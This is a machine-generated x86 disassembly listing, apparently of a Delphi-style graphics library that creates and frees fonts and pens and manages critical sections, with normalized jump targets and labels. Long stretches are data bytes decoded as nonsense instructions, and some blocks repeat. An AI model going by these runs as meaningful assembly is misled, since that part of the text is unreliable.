inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x54004010 ] ah
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
inc eax
add [ eax + 0x100041b7 ] dh
push esp
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
mov dh 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
mov dh 0x41
add [ eax + eax ] dh
add [ eax ] al
sub [ ebx + 0x34540041 ] dh
inc eax
add [ eax + 0x40 ] ah
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + 0x3fa00042 ] cl
inc ecx
add [ ebx + ebp * 8 ] ch
inc ecx
add [ edx + 0x40f00042 ] bh
inc ecx
add [ edx + ebp * 8 + 0x159c0041 ] bh
inc edx
add [ eax - 0x15 ] bh
inc ecx
add ah bl
adc eax 0x16080042
inc edx
add al al
in al dx
inc ecx
add ah al
in al dx
inc ecx
add [ esi + edx ] bl
inc edx
add [ ebp + ebp * 8 + 0x41 ] al
add [ eax - 0x57ffbde8 ] ah
in eax dx
inc ecx
add [ eax - 0x43ffbde8 ] bh
sbb [ edx ] al
mov esp 0xb80041ed
adc al 0x42
add al cl
in al dx
inc ecx
add [ eax - 0x13 ] dl
inc ecx
add [ edi + edx + 0x42 ] bl
add ah dl
sbb [ edx ] al
cld
sbb [ edx ] al
adc [ ecx ] bl
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
shl [ esi + 0x5070041 ] 0x1
push esp
dec ecx
arpl [ edi + 0x6e ] bp
pushad
mov dh 0x41
add ah ch
mov bl 0x41
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
add al 0xb6
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
mov dh 0x41
add [ eax ] bl
add [ eax ] al
add [ eax ] dl
mov ah 0x41
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax + 0x14 ] dh
inc edx
add [ eax + 0xa004214 ] ah
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
cmpsd [ esi ] [ edi ]
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_403580
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41b545
in al dx
inc ecx
add [ ebx + eax ] ah
inc edx
add [ eax ] dl
pop es
inc edx
add [ edi + ecx ] cl
inc edx
add al ah
cmovb eax [ eax ]
lodsb [ esi ]
in eax dx
inc ecx
add [ eax + edx + 0x11080042 ] dh
inc edx
add [ eax ] ch
cld
inc ecx
add al cl
in al dx
inc ecx
add [ eax - 0x13 ] dl
inc ecx
add ah ch
add eax 0x13c80042
inc edx
add [ eax + 0x5 ] ch
inc edx
add al dl
adc eax [ edx ]
cmp [ edx ] al
inc edx
add [ eax - 0x2bffbdfe ] bl
or eax 0x54070042
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b59870
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x41b51c70
add ah ch
mov bl 0x41
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
popad
nop
pushad
mov dh 0x41
add [ eax ] al
jo r-xdata
inc eax
add [ eax + 0x100041b7 ] dh
push esp
push edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
mov dh 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
mov dh 0x41
add [ eax + eax ] dh
add [ eax ] al
sub [ ebx + 0x34540041 ] dh
inc eax
add [ eax + 0x40 ] ah
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + 0x3fa00042 ] cl
inc ecx
add [ ebx + ebp * 8 ] ch
inc ecx
add [ edx + 0x40f00042 ] bh
inc ecx
add [ edx + ebp * 8 + 0x159c0041 ] bh
inc edx
add [ eax - 0x15 ] bh
inc ecx
add ah bl
adc eax 0x16080042
inc edx
add al al
in al dx
inc ecx
add ah al
in al dx
inc ecx
add [ esi + edx ] bl
inc edx
add [ ebp + ebp * 8 + 0x41 ] al
add [ eax - 0x57ffbde8 ] ah
in eax dx
inc ecx
add [ eax - 0x43ffbde8 ] bh
sbb [ edx ] al
mov esp 0xb80041ed
adc al 0x42
add al cl
in al dx
inc ecx
add [ eax - 0x13 ] dl
inc ecx
add [ edi + edx + 0x42 ] bl
add ah dl
sbb [ edx ] al
cld
sbb [ edx ] al
adc [ ecx ] bl
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
shl [ esi + 0x5070041 ] 0x1
push esp
dec ecx
arpl [ edi + 0x6e ] bp
pushad
mov dh 0x41
add ah ch
mov bl 0x41
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
add al 0xb6
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
mov dh 0x41
add [ eax ] bl
add [ eax ] al
add [ eax ] dl
mov ah 0x41
add [ esp + esi + 0x40 ] dl
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax + 0x14 ] dh
inc edx
add [ eax + 0xa004214 ] ah
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
cmpsd [ esi ] [ edi ]
jne r-xdata
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
retn
cmp eax [ rw-data ]
pop esi
pop ebx
retn
mov eax esi
call sub_403580
je r-xdata
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41b700
dec esp
mov bh 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 4 + 0x41 ] cl
add [ eax + eax ] ah
add [ eax ] al
mov al [ 0x54004010 ]
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ eax + 0x100041b7 ] dh
push esp
push edx
jae r-xdata
cmpsd [ esi ] [ edi ]
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_41b774
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_41b7b0
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_41b7ec
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_41b760
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_41b7d4
xor edx edx
push ebp
push sub_41b8c0
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b8c7
mov eax [ ebp - 0x4 ]
call sub_41b7e0
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_4026bc
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4028b8
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_407aec
test al al
je r-xdata
sub_41b8d0
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b7d4
xor ecx ecx
push ebp
push sub_41b957
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b7e0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_41b980
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b7d4
xor eax eax
push ebp
push sub_41b9e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_41b7ec
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41b8d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b9f0
mov eax [ ebp - 0x4 ]
call sub_41b7e0
retn
mov eax ebx
mov si 0xfffd
call sub_403420
sub_41b9f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b7d4
xor eax eax
push ebp
push sub_41ba54
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ba5b
mov eax [ ebp - 0x4 ]
call sub_41b7e0
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403420
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41b8d0
sub_41ba64
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41b7d4
xor edx edx
push ebp
push sub_41bac3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41baca
mov eax [ ebp - 0x4 ]
call sub_41b7e0
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_41bad0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_413c84
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41bb6d
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413918
mov ebx eax
mov eax ebx
call sub_41d0e4
inc [ ebp - 0x4 ]
mov eax ebx
call sub_41d550
mov eax [ rw-data ]
call sub_41ba64
mov eax [ rw-data ]
call sub_41ba64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41bb74
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_413ce8
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_413918
call sub_41d428
inc esi
dec ebx
jne r-xdata
sub_41bfcc
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41c024
test al al
jne r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_407fd0
mov [ esp ] eax
sub_41bff0
push ebp
mov ebp esp
push ebx
push esi
mov esi 0x34
mov ebx rw-data
mov edx [ ebx ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
add ebx 0x8
dec esi
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x8
sub_41c20b
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_4133c8
retn
sub_41c23c
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402d40
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402b30
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_41c2f0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41b7ec
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_41c344
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41b8d0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_41c388
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413ebc
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c048
xor eax eax
push ebp
push sub_41c443
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c048
xor eax eax
push ebp
push sub_41c426
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b9f8
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41c4c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c42d
mov eax [ ebp - 0x8 ]
call sub_41c058
retn
mov eax ebx
call sub_41c748
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41c764
sub_41c474
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c048
xor eax eax
push ebp
push sub_41c4b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b980
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c4c0
mov eax [ ebp - 0x4 ]
call sub_41c058
retn
sub_41c4d8
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41c661
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c668
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403f80
retn
mov eax [ rw-data ]
call sub_41b7d4
xor eax eax
push ebp
push sub_41c639
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41b7e0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4041c0
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408540
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_4041c0
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408540
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_4041c0
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407bbc
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_41c7bc
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_41c680
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_41c23c
mov edx esp
mov eax ebx
call sub_41c474
add esp 0x2c
pop esi
pop ebx
retn
sub_41c6ac
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41c45c
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41c474
add esp 0x2c
pop esi
pop ebx
retn
sub_41c6ec
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_41c45c
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402c40
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_4041f8
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402b30
mov edx esp
mov eax ebx
call sub_41c474
sub_41c764
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_41c6ac
pop esi
pop ebx
retn
sub_41c790
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41c45c
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_41c474
add esp 0x30
pop ebx
retn
sub_41c7c4
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c45c
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_41c474
add esp 0x2c
pop esi
pop ebx
retn
sub_41c7f4
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c45c
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_41c474
add esp 0x2c
pop esi
pop ebx
retn
sub_41c81c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41b7ec
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_41c860
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41b8d0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_41c888
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_413ebc
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41c048
xor eax eax
push ebp
push sub_41c927
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41c048
xor eax eax
push ebp
push sub_41c90a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b9f8
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41ca70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c911
mov eax [ ebp - 0x8 ]
call sub_41c058
retn
sub_41c940
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41c958
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41c048
xor eax eax
push ebp
push sub_41c99d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41b980
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41c9a4
mov eax [ ebp - 0x4 ]
call sub_41c058
retn
sub_41c9b0
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_41c940
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_41c958
add esp 0x10
pop esi
pop ebx
retn
sub_41c9d8
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41b7d4
xor eax eax
push ebp
push sub_41ca5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41b7e0
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41bfbc
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_41ca8c
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_41c940
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_41c958
add esp 0x10
pop esi
pop ebx
retn
sub_41cabc
push ebx
push esi
add esp 0xfffffff0
